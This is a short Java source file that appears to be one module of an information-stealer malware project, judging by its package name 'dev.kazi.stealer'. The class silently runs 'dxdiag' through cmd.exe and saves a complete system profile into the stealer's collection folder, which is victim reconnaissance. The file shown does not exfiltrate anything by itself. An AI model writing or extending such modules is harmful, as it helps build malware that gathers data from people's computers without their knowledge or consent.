package dev.kazi.stealer.node.nodes.impl;

import java.io.IOException;
import java.lang.ProcessBuilder;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Properties extends Node {

    public Properties() {
        super(Category.FILE);
    }

    @Override
    public void createNode() {
        try {
            final ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "dxdiag", "/t", this.getFolder() + "\\Properties.txt");
            final java.lang.Process p = pb.start();
            p.waitFor();
            p.destroy();
        }
        catch (final InterruptedException | IOException e) {
            e.printStackTrace();
        }
    }
}
